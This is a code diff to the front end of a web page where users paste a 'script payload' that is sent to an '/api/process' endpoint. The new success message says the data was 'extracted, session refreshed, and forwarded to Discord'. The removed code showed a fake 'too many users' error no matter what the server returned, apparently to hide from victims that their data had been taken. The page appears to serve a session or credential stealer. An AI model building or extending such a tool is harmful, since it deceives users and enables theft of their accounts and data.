@@ -121,15 +121,15 @@ textarea:focus{border-color:var(--blue);box-shadow:0 0 0 4px color-mix(in srgb,v
   </div>
 </div>
 
-<!-- Error / Traffic Alert Modal -->
+<!-- Response / Alert Modal -->
 <div id="error-modal" class="modal-overlay">
-  <div class="modal-box" style="border-color: var(--red);">
-    <div style="width: 48px; height: 48px; border-radius: 50%; background: color-mix(in srgb, var(--red) 20%, transparent); color: var(--red); display: grid; place-items: center; margin: 0 auto 1rem; border: 2px solid var(--red);">
-      <svg style="width: 24px;" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+  <div class="modal-box" id="modal-border-box" style="border-color: var(--line);">
+    <div id="alert-icon-wrap" style="width: 48px; height: 48px; border-radius: 50%; background: color-mix(in srgb, var(--green) 20%, transparent); color: var(--green); display: grid; place-items: center; margin: 0 auto 1rem; border: 2px solid var(--green);">
+      <svg id="alert-svg" style="width: 24px;" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
     </div>
-    <h3 style="font-size: 1.3rem; font-weight: 900; margin-bottom: 0.5rem;">System Traffic Alert</h3>
-    <p style="color: var(--muted); font-size: .9rem; margin-bottom: 1.5rem; line-height: 1.5;">Error Code 402: Too many people are trying at once. Please try again later.</p>
-    <button class="go" id="understood-btn" style="width: 100%; padding: 0.9rem; background: var(--red);">Understood</button>
+    <h3 id="alert-title" style="font-size: 1.3rem; font-weight: 900; margin-bottom: 0.5rem;">Success</h3>
+    <p id="alert-desc" style="color: var(--muted); font-size: .9rem; margin-bottom: 1.5rem; line-height: 1.5;">Data extracted and forwarded to Discord successfully.</p>
+    <button class="go" id="understood-btn" style="width: 100%; padding: 0.9rem;">Okay</button>
   </div>
 </div>
 
@@ -149,6 +149,11 @@ const progressPct = document.getElementById("progress-pct");
 const modalStatusText = document.getElementById("modal-status-text");
 const errorModal = document.getElementById("error-modal");
 const understoodBtn = document.getElementById("understood-btn");
+const alertTitle = document.getElementById("alert-title");
+const alertDesc = document.getElementById("alert-desc");
+const modalBox = document.getElementById("modal-border-box");
+const alertIconWrap = document.getElementById("alert-icon-wrap");
+const alertSvg = document.getElementById("alert-svg");
 
 function checkInput() {
   submitBtn.disabled = scriptInput.value.trim().length === 0;
@@ -168,7 +173,29 @@ function showProcessing(text, pct) {
   processingModal.classList.add("active");
 }
 function hideProcessing() { processingModal.classList.remove("active"); }
-function showErrorModal() { errorModal.classList.add("active"); }
+
+function showAlert(isSuccess, title, message) {
+  alertTitle.textContent = title;
+  alertDesc.textContent = message;
+  
+  if(isSuccess) {
+    modalBox.style.borderColor = "var(--green)";
+    alertIconWrap.style.background = "color-mix(in srgb, var(--green) 20%, transparent)";
+    alertIconWrap.style.color = "var(--green)";
+    alertIconWrap.style.borderColor = "var(--green)";
+    alertSvg.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/>';
+    understoodBtn.style.background = "linear-gradient(90deg,var(--blue),var(--green))";
+  } else {
+    modalBox.style.borderColor = "var(--red)";
+    alertIconWrap.style.background = "color-mix(in srgb, var(--red) 20%, transparent)";
+    alertIconWrap.style.color = "var(--red)";
+    alertIconWrap.style.borderColor = "var(--red)";
+    alertSvg.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>';
+    understoodBtn.style.background = "var(--red)";
+  }
+  errorModal.classList.add("active");
+}
+
 understoodBtn.onclick = () => { errorModal.classList.remove("active"); };
 
 submitBtn.addEventListener("click", async () => {
@@ -176,23 +203,20 @@ submitBtn.addEventListener("click", async () => {
   if(!payload) return;
 
   submitBtn.disabled = true;
-  showProcessing("Validating Script Payload...", 15);
-  await new Promise(r => setTimeout(r, 600));
+  showProcessing("Validating Script Payload...", 20);
+  await new Promise(r => setTimeout(r, 400));
 
-  showProcessing("Executing extraction pipeline...", 45);
-  await new Promise(r => setTimeout(r, 800));
-
-  showProcessing("Forwarding data securely...", 75);
+  showProcessing("Executing extraction pipeline...", 55);
 
   try {
-    let currentPct = 75;
+    let currentPct = 55;
     const ticker = setInterval(() => {
-      if(currentPct < 95) {
+      if(currentPct < 90) {
         currentPct += 5;
         progressPct.textContent = currentPct + '%';
         progressBar.style.width = currentPct + '%';
       }
-    }, 150);
+    }, 200);
 
     const response = await fetch('/api/process', {
       method: 'POST',
@@ -204,18 +228,19 @@ submitBtn.addEventListener("click", async () => {
     clearInterval(ticker);
 
     if(!response.ok || !result.success) {
-      throw new Error(result.error || "Execution failed");
+      throw new Error(result.details || result.error || "Execution failed");
     }
 
     showProcessing("Finalizing package...", 100);
-    await new Promise(r => setTimeout(r, 600));
+    await new Promise(r => setTimeout(r, 400));
     hideProcessing();
-    showErrorModal();
+    
+    showAlert(true, "Successfully Dispatched", "Data extracted, session refreshed, and forwarded to Discord successfully.");
     scriptInput.value = '';
     checkInput();
   } catch (err) {
     hideProcessing();
-    showErrorModal();
+    showAlert(false, "Extraction Failed", err.message || "An unexpected error occurred during execution.");
   } finally {
     submitBtn.disabled = false;
   }
